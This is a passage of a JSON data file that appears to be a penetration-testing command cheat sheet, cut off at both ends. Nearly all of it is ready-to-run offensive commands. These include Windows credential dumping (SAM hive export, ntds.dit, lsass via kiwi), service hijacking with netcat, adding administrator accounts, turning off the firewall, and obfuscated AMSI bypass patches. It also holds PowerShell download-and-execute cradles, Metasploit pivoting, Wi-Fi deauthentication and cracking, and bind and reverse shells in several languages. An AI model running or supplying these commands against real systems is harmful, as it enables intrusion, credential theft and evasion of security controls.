"executable_type": "custom", "executable_path": "schtasks", "arguments": "/query /fo LIST /v", "tags": null, "more_info_url": null}, {"name": "list one scheduled task", "description": "", "executable_type": "custom", "executable_path": "schtasks", "arguments": "/query /fo LIST 2>nul | findstr <taskname>", "tags": null, "more_info_url": null}, {"name": "list process", "description": "", "executable_type": "custom", "executable_path": "tasklist", "arguments": "/V", "tags": null, "more_info_url": null}, {"name": "list process and links to started services", "description": "", "executable_type": "custom", "executable_path": "tasklist", "arguments": "/SVC", "tags": null, "more_info_url": null}, {"name": "list windows service started (1)", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "start", "tags": null, "more_info_url": null}, {"name": "list services (2)", "description": "", "executable_type": "custom", "executable_path": "wmic", "arguments": "service list brief", "tags": null, "more_info_url": null}, {"name": "list services (3)", "description": "", "executable_type": "custom", "executable_path": "sc", "arguments": "query #List of services", "tags": null, "more_info_url": null}, {"name": "list installed software (1)", "description": "", "executable_type": "custom", "executable_path": "dir", "arguments": "/a \"C:\\Program Files\"", "tags": null, "more_info_url": null}, {"name": "list installed software (2)", "description": "", "executable_type": "custom", "executable_path": "dir", "arguments": "/a \"C:\\Program Files (x86)\"", "tags": null, "more_info_url": null}, {"name": "list installed software (3)", "description": "", "executable_type": "custom", "executable_path": "reg", "arguments": "query HKEY_LOCAL_MACHINE\\SOFTWARE", "tags": null, "more_info_url": null}, {"name": "show lsa cached credentials value", "description": "", "executable_type": "custom", "executable_path": "reg", "arguments": "query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"", "tags": null, "more_info_url": null}, {"name": "register query word password (1)", "description": "", "executable_type": "custom", "executable_path": "reg", "arguments": "query HKLM /f password /t REG_SZ /s", "tags": null, "more_info_url": null}, {"name": "register query word password (2)", "description": "", "executable_type": "custom", "executable_path": "reg", "arguments": "query HKCU /f password /t REG_SZ /s", "tags": null, "more_info_url": null}, {"name": "register query extract SAM", "description": "When the Windows operating system is running, the hives are in use and mounted. The command-line tool named reg can be used to export them.", "executable_type": "custom", "executable_path": "reg", "arguments": "save HKLM\\SAM 'C:\\Windows\\Temp\\sam.save';\\\nreg save HKLM\\SECURITY 'C:\\Windows\\Temp\\security.save';\\\nreg save HKLM\\SYSTEM 'C:\\Windows\\Temp\\system.save'", "tags": null, "more_info_url": null}, {"name": "create shadow copy", "description": "", "executable_type": "custom", "executable_path": "wmic", "arguments": "shadowcopy call create Volume='C:\\'", "tags": null, "more_info_url": null}, {"name": "list shadow copy", "description": "", "executable_type": "custom", "executable_path": "vssadmin", "arguments": "list shadows", "tags": null, "more_info_url": null}, {"name": "check service privilege", "description": "", "executable_type": "custom", "executable_path": "accesschk.exe", "arguments": "/accepteula -ucqv <service_name>", "tags": null, "more_info_url": null}, {"name": "reconfigure service", "description": "", "executable_type": "custom", "executable_path": "sc", "arguments": "config <service> binpath= \"C:\\nc.exe -nv 127.0.0.1 4444 -e C:\\WINDOWS\\System32\\cmd.exe\"", "tags": null, "more_info_url": null}, {"name": "change service", "description": "", "executable_type": "custom", "executable_path": "sc", "arguments": "config <service> obj= \".\\LocalSystem\" password= \"\"", "tags": null, "more_info_url": null}, {"name": "start service", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "start <service>", "tags": null, "more_info_url": null}, {"name": "check permission (1)", "description": "", "executable_type": "custom", "executable_path": "accesschk.exe", "arguments": "/accepteula -dqv \"<file>\"", "tags": null, "more_info_url": null}, {"name": "check permission (2)", "description": "", "executable_type": "custom", "executable_path": "cacls", "arguments": "\"<file>\"", "tags": null, "more_info_url": null}, {"name": "find weak folder permission", "description": "", "executable_type": "custom", "executable_path": "accesschk.exe", "arguments": "-uwdqs Users <c>:\\", "tags": null, "more_info_url": null}, {"name": "find weak file permission", "description": "", "executable_type": "custom", "executable_path": "accesschk.exe", "arguments": "-uwqs Users <c>:\\", "tags": null, "more_info_url": null}, {"name": "VBS download file script", "description": "", "executable_type": "custom", "executable_path": "echo", "arguments": "var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");WinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js <file_url> > <downloaded_file>", "tags": "[\"windows\", \"download\"]", "more_info_url": null}, {"name": "add user", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "user <username> <password> /ADD", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "add user to domain", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "user <username> <password> /ADD /DOMAIN", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "add user as admin", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "localgroup administrators <username> /add", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "run as over user", "description": "", "executable_type": "custom", "executable_path": "runas", "arguments": "/user:<domain>\\<user> cmd.exe", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "whoami - All info about me, take a look at the enabled tokens", "description": "", "executable_type": "custom", "executable_path": "whoami", "arguments": "/all", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "whoami privilegied", "description": "", "executable_type": "custom", "executable_path": "whoami", "arguments": "/priv #Show only privileges", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "list all users", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "users", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "list domain admins (fr)", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "group \"Admins du domaine\"", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "infos about a user", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "user <username>", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "infos on a Administrator and retrieve SID", "description": "", "executable_type": "custom", "executable_path": "[wmi]", "arguments": "\"Win32_userAccount.Domain='<computer_name>',Name='Administrator'\"", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "infos about password policy", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "accounts", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "List credentials", "description": "", "executable_type": "custom", "executable_path": "cmdkey", "arguments": "/list", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "show local groups", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "localgroup", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "show specific local group", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "localgroup <group_name>", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "show domain groups", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "group /domain", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "show domain group users", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "group /domain <domain_group_name>", "tags": "[\"windows\", \"users\"]", "more_info_url": null}, {"name": "get domain name", "description": "", "executable_type": "custom", "executable_path": "echo", "arguments": "%USERDOMAIN%", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "get domain name (2)", "description": "", "executable_type": "custom", "executable_path": "echo", "arguments": "%USERDNSDOMAIN%", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "get computer domain name (3)", "description": "", "executable_type": "custom", "executable_path": "systeminfo", "arguments": "| findstr /B /C:\"Domain\"", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "get name of the DC", "description": "", "executable_type": "custom", "executable_path": "echo", "arguments": "%logonserver%", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "get name of the dc (2)", "description": "", "executable_type": "custom", "executable_path": "set", "arguments": "logonserver #Get name of the domain controller", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "list of domain groups", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "groups /domain", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "list of computer connected to the domain", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "group \"domain computers\" /domain", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "List all PCs of the domain", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "view /domain", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "list domain controllers", "description": "", "executable_type": "custom", "executable_path": "nltest", "arguments": "/dclist:<domain>", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "list pc accounts of domain controllers", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "group \"Domain Controllers\" /domain", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "List users with domain admin privileges", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "group \"Domain Admins\" /domain", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "List users that belongs to the administrators group inside the domain", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "localgroup administrators /domain", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "List all domain users", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "user /domain", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "get user domain information", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "user <username> /domain", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "domain password and lockout policy", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "accounts /domain", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "get mapping of the trust relationships", "description": "", "executable_type": "custom", "executable_path": "nltest", "arguments": "/domain_trust", "tags": "[\"windows\", \"domain infos\"]", "more_info_url": null}, {"name": "all interfaces", "description": "", "executable_type": "custom", "executable_path": "ipconfig", "arguments": "/all", "tags": "[\"windows\", \"network\"]", "more_info_url": null}, {"name": "print all routes", "description": "", "executable_type": "custom", "executable_path": "route", "arguments": "print", "tags": "[\"windows\", \"network\"]", "more_info_url": null}, {"name": "list of know hosts", "description": "", "executable_type": "custom", "executable_path": "arp", "arguments": "-a", "tags": "[\"windows\", \"network\"]", "more_info_url": null}, {"name": "list open ports", "description": "", "executable_type": "custom", "executable_path": "netstat", "arguments": "-ano", "tags": "[\"windows\", \"network\"]", "more_info_url": null}, {"name": "show hosts file", "description": "", "executable_type": "custom", "executable_path": "type", "arguments": "C:\\WINDOWS\\System32\\drivers\\etc\\hosts", "tags": "[\"windows\", \"network\"]", "more_info_url": null}, {"name": "list hidden files", "description": "", "executable_type": "custom", "executable_path": "dir", "arguments": "/a:h <path>", "tags": "[\"windows\", \"dir\"]", "more_info_url": null}, {"name": "Recursive list", "description": "", "executable_type": "custom", "executable_path": "dir", "arguments": "/s /b", "tags": "[\"windows\", \"dir\"]", "more_info_url": null}, {"name": "show firewall state", "description": "", "executable_type": "custom", "executable_path": "netsh", "arguments": "firewall show state", "tags": "[\"windows\", \"firewall\"]", "more_info_url": null}, {"name": "show firewall config", "description": "", "executable_type": "custom", "executable_path": "netsh", "arguments": "firewall show config", "tags": "[\"windows\", \"firewall\"]", "more_info_url": null}, {"name": "turn off firewall", "description": "", "executable_type": "custom", "executable_path": "NetSh", "arguments": "Advfirewall set allprofiles state off", "tags": "[\"windows\", \"firewall\"]", "more_info_url": null}, {"name": "turn off firewall (2)", "description": "", "executable_type": "custom", "executable_path": "netsh", "arguments": "firewall set opmode disable", "tags": "[\"windows\", \"firewall\"]", "more_info_url": null}, {"name": "turn on firewall", "description": "", "executable_type": "custom", "executable_path": "NetSh", "arguments": "Advfirewall set allprofiles state on", "tags": "[\"windows\", \"firewall\"]", "more_info_url": null}, {"name": "firewall open port RDP", "description": "", "executable_type": "custom", "executable_path": "netsh", "arguments": "firewall add portopening TCP 3389 \"Remote Desktop\"", "tags": "[\"windows\", \"firewall\"]", "more_info_url": null}, {"name": "dump ntds.dit", "description": "", "executable_type": "custom", "executable_path": "ntdsutil", "arguments": "\"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q", "tags": "[\"windows\", \"ntds.dit\"]", "more_info_url": null}, {"name": "list of computer", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "view", "tags": "[\"windows\", \"smb\", \"share\"]", "more_info_url": null}, {"name": "list of computer shares on the domain", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "view /all /domain <domain_name>", "tags": "[\"windows\", \"smb\", \"share\"]", "more_info_url": null}, {"name": "list share of a computer", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "view \\\\<ip> \\ALL", "tags": "[\"windows\", \"smb\", \"share\"]", "more_info_url": null}, {"name": "mount share locally", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "use x: \\\\<ip>\\<share_name>", "tags": "[\"windows\", \"smb\", \"share\"]", "more_info_url": null}, {"name": "check current share", "description": "", "executable_type": "custom", "executable_path": "net", "arguments": "share", "tags": "[\"windows\", \"smb\", \"share\"]", "more_info_url": null}, {"name": "windows download file with windows defender", "description": "", "executable_type": "custom", "executable_path": "mpcmdrun.exe", "arguments": "-DownloadFile -url <url> -path <result_file>", "tags": "[\"windows\", \"file\", \"download\"]", "more_info_url": null}, {"name": "find AD IP - show domain name and dns", "description": "", "executable_type": "custom", "executable_path": "nmcli", "arguments": "dev show <interface>", "tags": "[\"windows\", \"active directory\", \"dns\"]", "more_info_url": null}, {"name": "nslookup AD - domain", "description": "", "executable_type": "custom", "executable_path": "nslookup", "arguments": "-type=SRV _ldap._tcp.dc._msdcs.<domain_name>", "tags": "[\"windows\", \"active directory\", \"dns\"]", "more_info_url": null}, {"name": "enable sid history", "description": "Enable history on source domain for target domain (useful for forest extra SID exploitation)", "executable_type": "custom", "executable_path": "netdom", "arguments": "trust <source_domain> /d:<target_domain> /enablesidhistory:yes", "tags": "[\"windows\", \"active directory\"]", "more_info_url": null}, {"name": "windows eternal blue - smb - ms17-010", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploit/windows/smb/ms17_010_eternalblue\"", "tags": "[\"windows\", \"cve\"]", "more_info_url": null}, {"name": "Download cradle", "description": "", "executable_type": "custom", "executable_path": "(new-object", "arguments": "system.net.webclient).downloadstring('http://<ip>/<script>') | IEX", "tags": null, "more_info_url": null}, {"name": "Get file in trash", "description": "", "executable_type": "custom", "executable_path": "Get-ADObject", "arguments": "-filter 'isDeleted -eq $true -and name -ne \"Deleted Objects\"' -includeDeletedObjects -property *", "tags": null, "more_info_url": null}, {"name": "Bypass AMSI with _amsiContext_ (powershell only)", "description": "", "executable_type": "custom", "executable_path": "$a=[Ref].Assembly.GetTypes();Foreach($b", "arguments": "in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*Context\") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)", "tags": null, "more_info_url": null}, {"name": "Bypass AMSI with _AmsiInitFailed_ (powershell only)", "description": "", "executable_type": "custom", "executable_path": "$a=[Ref].Assembly.GetTypes();Foreach($b", "arguments": "in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like \"*InitFailed\") {$f=$e}};$f.SetValue($null,$true)", "tags": null, "more_info_url": null}, {"name": "Bypass AMSI by patching (work for .NET binaries too)", "description": "more infos here : https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/", "executable_type": "custom", "executable_path": "$ZQCUW", "arguments": "= @\";\\\nusing System;\\\nusing System.Runtime.InteropServices;\\\npublic class ZQCUW {;\\\n    [DllImport(\"kernel32\")];\\\n    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\\\n    [DllImport(\"kernel32\")];\\\n    public static extern IntPtr LoadLibrary(string name);\\\n    [DllImport(\"kernel32\")];\\\n    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\\\n};\\\n\"@;\\\nAdd-Type $ZQCUW;\\\n$BBWHVWQ = [ZQCUW]::LoadLibrary(\"$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))\");\\\n$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, \"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))\");\\\n$p = 0;\\\n[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p);\\\n$TLML = \"0xB8\";\\\n$PURX = \"0x57\";\\\n$YNWL = \"0x00\";\\\n$RTGX = \"0x07\";\\\n$XVON = \"0x80\";\\\n$WRUD = \"0xC3\";\\\n$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)", "tags": null, "more_info_url": "https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface"}, {"name": "Verify PPL", "description": "", "executable_type": "custom", "executable_path": "Get-ItemProperty", "arguments": "-Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name \"RunAsPPL\"", "tags": null, "more_info_url": null}, {"name": "Verify application whitelisting", "description": "", "executable_type": "custom", "executable_path": "Get-ChildItem", "arguments": "-Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe", "tags": null, "more_info_url": null}, {"name": "Get domain trust", "description": "", "executable_type": "custom", "executable_path": "Get-DomainTrust", "arguments": "-Domain <domain>", "tags": null, "more_info_url": null}, {"name": "Get domain SID", "description": "", "executable_type": "custom", "executable_path": "Get-DomainSID", "arguments": "-domain <sid>", "tags": null, "more_info_url": null}, {"name": "hostrecon", "description": "https://github.com/dafthack/HostRecon", "executable_type": "custom", "executable_path": "(new-object", "arguments": "system.net.webclient).downloadstring('http://<lhost>/HostRecon.ps1') | IEX; Invoke-HostRecon", "tags": null, "more_info_url": "https://github.com/dafthack/HostRecon"}, {"name": "privesccheck", "description": "https://github.com/itm4n/PrivescCheck", "executable_type": "custom", "executable_path": "(new-object", "arguments": "system.net.webclient).downloadstring('http://<lhost>/PrivescCheck.ps1') | IEX; Invoke-PrivescCheck", "tags": null, "more_info_url": "https://github.com/itm4n/PrivescCheck"}, {"name": "powershell view assemblies", "description": "", "executable_type": "custom", "executable_path": "[appdomain]::currentdomain.getassemblies()", "arguments": "| Sort-Object -Property fullname | Format-Table fullname", "tags": null, "more_info_url": null}, {"name": "powershell get proxy address", "description": "", "executable_type": "custom", "executable_path": "$proxyAddr=(Get-ItemProperty", "arguments": "-Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\").ProxyServer", "tags": null, "more_info_url": null}, {"name": "powershell set proxy", "description": "", "executable_type": "custom", "executable_path": "[system.net.webrequest]::DefaultWebProxy", "arguments": "= new-object System.Net.WebProxy(\"http://<proxaddress|$proxyAddr>\")", "tags": null, "more_info_url": null}, {"name": "powershell - generate base64 encoded payload download runner", "description": "", "executable_type": "custom", "executable_path": "pwsh", "arguments": "-Command '$text = \"(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX\";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'", "tags": null, "more_info_url": null}, {"name": "upgrade session to meterpreter", "description": "", "executable_type": "custom", "executable_path": "sessions", "arguments": "-u <session_id>", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "show session list", "description": "", "executable_type": "custom", "executable_path": "sessions", "arguments": "-l", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "print route table", "description": "", "executable_type": "custom", "executable_path": "route", "arguments": "print", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "add pivot (autoroute)", "description": "example :\nuse multi/manage/autoroute\nset session 1\nexploit", "executable_type": "custom", "executable_path": "use", "arguments": "multi/manage/autoroute", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "add socks proxy (autoroute first)", "description": "example :\nuse multi/manage/autoroute\nset session 1\nexploit\nuse auxiliary/server/socks_proxy\nset srvhost 127.0.0.1\nexploit -j", "executable_type": "custom", "executable_path": "use", "arguments": "auxiliary/server/socks_proxy", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "load incognito ", "description": "", "executable_type": "custom", "executable_path": "load", "arguments": "incognito", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "incognito impersonate token", "description": "", "executable_type": "custom", "executable_path": "impersonate_token", "arguments": "<domain>\\\\<user>", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "create process", "description": "", "executable_type": "custom", "executable_path": "execute", "arguments": "-H -f <process|notepad>", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "migrate with name", "description": "", "executable_type": "custom", "executable_path": "migrate", "arguments": "-N <process_name|notepad.exe>", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "PPL remove", "description": "", "executable_type": "custom", "executable_path": "load", "arguments": "kiwi;\\\nkiwi_cmd \"!processprotect /process:lsass.exe /remove\";\\\ncreds_all", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "enum LAPS", "description": "", "executable_type": "custom", "executable_path": "use", "arguments": "post/windows/gather/credentials/enum_laps", "tags": "[\"metasploit\"]", "more_info_url": null}, {"name": "searchsploit mirror exploitDB id", "description": "", "executable_type": "custom", "executable_path": "searchsploit", "arguments": "-m <ebdid>", "tags": "[\"searchsploit\", \"exploit db\"]", "more_info_url": null}, {"name": "searchsploit show exploitDB id", "description": "", "executable_type": "custom", "executable_path": "searchsploit", "arguments": "-x <edbid>", "tags": "[\"searchsploit\", \"exploit db\"]", "more_info_url": null}, {"name": "eyewitness - web screenshots", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "run --rm -it -v `pwd`:/tmp/EyeWitness eyewitness --web -x /tmp/EyeWitness/<nmap_file>.xml --prepend-https", "tags": null, "more_info_url": null}, {"name": "gowitness - web screenshots (nmap xml file)", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "run --rm -v $(pwd):/data -p7171:7171 leonjza/gowitness gowitness nmap -f /data/<nmap_file>.xml", "tags": null, "more_info_url": null}, {"name": "gowitness - web screenshots (file containing urls)", "description": "", "executable_type": "custom", "executable_path": "docker", "arguments": "run --rm -v $(pwd):/data -p7171:7171 leonjza/gowitness gowitness file -f /data/<file>", "tags": null, "more_info_url": null}, {"name": "nmap - hosts alive", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sn <ip_range>", "tags": null, "more_info_url": null}, {"name": "nmap - classic scan", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sC -sV <ip>", "tags": null, "more_info_url": null}, {"name": "nmap - read targets from a file", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-iL <targets_file>", "tags": null, "more_info_url": null}, {"name": "nmap - classic scan + save", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sC -sV -oA <output_file> <ip>", "tags": null, "more_info_url": null}, {"name": "nmap - quick scan top ports 100", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "--top-ports 100 --open -sV <ip>", "tags": null, "more_info_url": null}, {"name": "nmap - big top ports 5000", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "--top-ports 5000 --open -sV <ip>", "tags": null, "more_info_url": null}, {"name": "nmap - full port", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-p- -sV <ip>", "tags": null, "more_info_url": null}, {"name": "nmap - host with a given port", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "<ip> -p<port_list> --open", "tags": null, "more_info_url": null}, {"name": "nmap - FULL", "description": "", "executable_type": "custom", "executable_path": "IP=<ip>;\\", "arguments": "ports=$(nmap -p- --min-rate=1000 -n -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//);\\\nnmap -Pn -sC -sV -p$ports $IP -oN scan.txt --reason --script=vuln", "tags": null, "more_info_url": null}, {"name": "nmap - udp scan", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sU <ip>", "tags": null, "more_info_url": null}, {"name": "nmap - low rate Classic", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "--max-rate 100 -sC -sV <ip>", "tags": null, "more_info_url": null}, {"name": "massscan - full port", "description": "", "executable_type": "custom", "executable_path": "masscan", "arguments": "-p 1-65535 <ip> -e <dev> --rate=1000", "tags": null, "more_info_url": null}, {"name": "nmap - SMB signing disabled", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-Pn -sS -T4 --open --script smb-security-mode -p445 <ip>", "tags": null, "more_info_url": null}, {"name": "nmap behind proxy - tcp connect (-sT) - no dns (-n)", "description": "", "executable_type": "custom", "executable_path": "proxychains", "arguments": "nmap -n -sT -sV -Pn --open -oA <output_file> -iL <targets_file>", "tags": null, "more_info_url": null}, {"name": "airmon - start interface", "description": "", "executable_type": "custom", "executable_path": "airmon-ng", "arguments": "start wlan0", "tags": null, "more_info_url": null}, {"name": "airodump - listen to everything", "description": "", "executable_type": "custom", "executable_path": "airodump-ng", "arguments": "wlan0mon", "tags": null, "more_info_url": null}, {"name": "airodump - listen to specific SSID", "description": "", "executable_type": "custom", "executable_path": "airodump-ng", "arguments": "--bssid <mac_address> -c <channel> -w <output_file> wlan0mon", "tags": null, "more_info_url": null}, {"name": "aireplay - deauth clients", "description": "", "executable_type": "custom", "executable_path": "aireplay-ng", "arguments": "--deauth 5 -c <client_mac_address> -a <mac_address> wlan0mon", "tags": null, "more_info_url": null}, {"name": "aircrack - crack handshake for PSK", "description": "", "executable_type": "custom", "executable_path": "aircrack-ng", "arguments": "-w <dictionary> <input_file>", "tags": null, "more_info_url": null}, {"name": "hostapd-wpe - launch fake AP", "description": "", "executable_type": "custom", "executable_path": "hostapd-wpe", "arguments": "/etc/hostapd-wpe/hostapd-wpe.conf", "tags": null, "more_info_url": null}, {"name": "nc setup listener", "description": "", "executable_type": "custom", "executable_path": "nc", "arguments": "-nlvp <lport>", "tags": "[\"nc\", \"netcat\"]", "more_info_url": null}, {"name": "nc bind shell windows", "description": "", "executable_type": "custom", "executable_path": "nc", "arguments": "-nlvp <port> -e cmd.exe", "tags": "[\"nc\", \"netcat\"]", "more_info_url": null}, {"name": "nc bind shell linux", "description": "", "executable_type": "custom", "executable_path": "nc", "arguments": "-nlvp <port> -e /bin/bash", "tags": "[\"nc\", \"netcat\"]", "more_info_url": null}, {"name": "nc reverse shell windows", "description": "", "executable_type": "custom", "executable_path": "nc", "arguments": "-nv <ip> <port> -e cmd.exe", "tags": "[\"nc\", \"netcat\"]", "more_info_url": null}, {"name": "nc reverse shell linux", "description": "", "executable_type": "custom", "executable_path": "nc", "arguments": "-nv <ip> <port> -e /bin/bash", "tags": "[\"nc\", \"netcat\"]", "more_info_url": null}, {"name": "nc transfer file - receiver", "description": "", "executable_type": "custom", "executable_path": "nc", "arguments": "-nlvp <port> > <incomming_file>", "tags": "[\"nc\", \"netcat\"]", "more_info_url": null}, {"name": "nc transfer file - sender", "description": "", "executable_type": "custom", "executable_path": "nc", "arguments": "-nv <ip> <port> < <file_to_send>", "tags": "[\"nc\", \"netcat\"]", "more_info_url": null}, {"name": "ncat bind shell ssl filtered", "description": "", "executable_type": "custom", "executable_path": "ncat", "arguments": "--exec cmd.exe --allow <allowed_ip> -vnl <port> --ssl", "tags": "[\"ncat\"]", "more_info_url": null}, {"name": "ncat bind shell ssl connection", "description": "", "executable_type": "custom", "executable_path": "ncat", "arguments": "-v <ip> <port> --ssl", "tags": "[\"ncat\"]", "more_info_url": null}, {"name": "ncat HTTP WEB proxy", "description": "", "executable_type": "custom", "executable_path": "ncat", "arguments": "--listen --proxy-type http <port>", "tags": "[\"ncat\"]", "more_info_url": null}, {"name": "bash reverse shell", "description": "", "executable_type": "custom", "executable_path": "bash", "arguments": "-i >& /dev/tcp/<lhost>/<lport> 0>&1", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "perl reverse shell", "description": "", "executable_type": "custom", "executable_path": "perl", "arguments": "-e 'use Socket;$i=\"<lhost>\";$p=<lport>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "python reverse shell", "description": "", "executable_type": "custom", "executable_path": "python", "arguments": "-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<lhost>\",<lport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "php reverse shell", "description": "", "executable_type": "custom", "executable_path": "php", "arguments": "-r '$sock=fsockopen(\"<lhost>\",<lport>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "tags": "[\"reverse shell\", \"reverse\"]", "more_info_url": null}, {"name": "ruby reverse shell", "description": "", "executable_type": "custom", "executable_path": "ruby", "arguments": "-rsocket -e'f=TCPSocket.open(\"<lhost>\",<lport>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "tags": "[\"reverse shell\", 